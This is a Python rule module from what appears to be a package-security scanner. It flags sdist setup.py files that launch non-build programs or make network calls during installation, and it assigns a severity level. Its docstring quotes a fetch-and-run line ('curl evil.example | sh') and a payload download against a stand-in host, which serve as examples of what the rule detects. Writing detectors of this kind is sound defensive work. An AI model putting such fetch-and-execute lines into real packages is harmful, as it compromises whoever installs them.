"""setup.py that starts programs or uses the network when the package is installed.

`pip install` of an sdist runs its setup.py, so anything in it runs on the
victim's machine before they've imported (or even looked at) the package:

    os.system("curl evil.example | sh")              # process
    requests.get("https://evil.example/payload")     # network

Honest setup.py files mostly just call setup(). Some run build tools: `git describe`
for a version number, `cargo build` or `protoc` to compile, `nvidia-smi` to see which
GPU build to make. Those are only low, when the command is written out in full:

- only build tools                                          -> low
- other programs, or network calls                          -> medium
- both (e.g. download something, then run it)               -> high
- a program run with decoded or downloaded data             -> critical

Only the sdist counts: wheels are installed by copying files, without running setup.py.
"""

from __future__ import annotations

import ast
from typing import Any

from crotalus.models import AnalysisContext, Finding, PyFile, Severity
from crotalus.rules.static_code_analysis_helpers import (
    calls,
    code_severity,
    full_name,
    is_network,
    is_process,
    read,
    runs_decoded_or_downloaded_data,
    snippet,
)

# Programs setup.py files run to build the package or describe the machine.
# Not shells, downloaders (curl, wget) or package managers (pip, npm), which run
# whatever they're given.
BUILD_TOOLS = {
    "git", "hg", "svn",
    "make", "cmake", "ninja", "meson", "pkg-config", "swig",
    "gcc", "g++", "cc", "c++", "clang", "clang++", "nvcc", "hipcc",
    "cargo", "rustc", "go", "protoc",
    "nvidia-smi", "rocm-smi", "xpu-smi", "npu-smi", "sycl-ls", "hipconfig", "nproc", "uname",
}  # fmt: skip

# Python running a file of the package is a build step too, but not `python -c code`
# or `python -m module` (e.g. pip), which run whatever they're given.
PYTHON = {"python", "python3", "sys.executable"}

# Characters that make a command do more than run one program: chain another
# command, pipe, redirect, or substitute a value.
SHELL_SPECIAL_CHARACTERS = set("|;&`$<>\n")


def check(context: AnalysisContext) -> list[Finding]:
    if context.sdist is None or "setup.py" not in context.sdist.files:
        return []
    py_file = read(context.sdist.files["setup.py"])
    if py_file is None:
        return []

    process_calls: set[str] = set()  # programs that aren't build tools
    build_tool_calls: set[str] = set()
    network_calls: set[str] = set()
    runs_hidden_data = False  # a program run with decoded or downloaded data
    call_locations: list[dict[str, Any]] = []  # where each call is, for the evidence
    for call_name, call_node in sorted(calls(py_file), key=lambda call: call[1].lineno):
        if call_name is None:
            continue
        if is_network(call_name):
            network_calls.add(call_name)
        elif not is_process(call_name):
            continue
        elif runs_decoded_or_downloaded_data(call_node, py_file):
            runs_hidden_data = True
            process_calls.add(call_name)
        elif _runs_build_tool(call_node, py_file):
            build_tool_calls.add(call_name)
        else:
            process_calls.add(call_name)
        call_locations.append(
            {"call": call_name, "line": call_node.lineno, "snippet": snippet(py_file, call_node)}
        )
    if not call_locations:
        return []

    behaviours = []
    if process_calls:
        behaviours.append("starts programs")
    elif build_tool_calls:
        behaviours.append("runs build tools")
    if network_calls:
        behaviours.append("uses the network")

    severity: Severity = "low"  # only build tools
    if process_calls or network_calls:
        severity = code_severity(bool(process_calls), bool(network_calls), runs_hidden_data)

    return [
        Finding(
            rule_id="setup_py_install_time",
            severity=severity,
            message=f"setup.py {' and '.join(behaviours)} at install time",
            evidence={
                "archive": "sdist",
                "file": "setup.py",
                "process_calls": sorted(process_calls),
                "build_tool_calls": sorted(build_tool_calls),
                "network_calls": sorted(network_calls),
                "runs_decoded_or_downloaded_data": runs_hidden_data,
                "calls": call_locations[:10],  # the first few is enough to see what it does
            },
        )
    ]


def _runs_build_tool(call_node: ast.Call, py_file: PyFile) -> bool:
    """Whether a process call runs a build tool, with the command written out in full.

    `subprocess.run(["git", "describe"])` or `os.system("make")` yes;
    `subprocess.run(cmd)`, `os.system("git pull | sh")` or `[sys.executable, "-c", code]` no.
    """
    command_words = _command_words(call_node, py_file)
    if not command_words or SHELL_SPECIAL_CHARACTERS & set("".join(command_words)):
        return False
    program = command_words[0].rsplit("/", 1)[-1]  # /usr/bin/git -> git
    if program in PYTHON:
        return command_words[1:2] not in (["-c"], ["-m"])
    return program in BUILD_TOOLS


def _command_words(call_node: ast.Call, py_file: PyFile) -> list[str]:
    """The command a process call runs, as words: ["git", "describe"].

    Empty if it isn't written out: a variable or built-up string (`subprocess.run(cmd)`)
    is only known when it runs. In a list, an element that isn't written out is "".
    """
    if not call_node.args:
        return []
    command = call_node.args[0]
    if isinstance(command, ast.Constant) and isinstance(command.value, str):  # "git describe"
        return command.value.split()
    if isinstance(command, (ast.List, ast.Tuple)):  # ["git", "describe"]
        return [
            element.value
            if isinstance(element, ast.Constant) and isinstance(element.value, str)
            else full_name(element, py_file.aliases) or ""  # sys.executable
            for element in command.elts
        ]
    return []
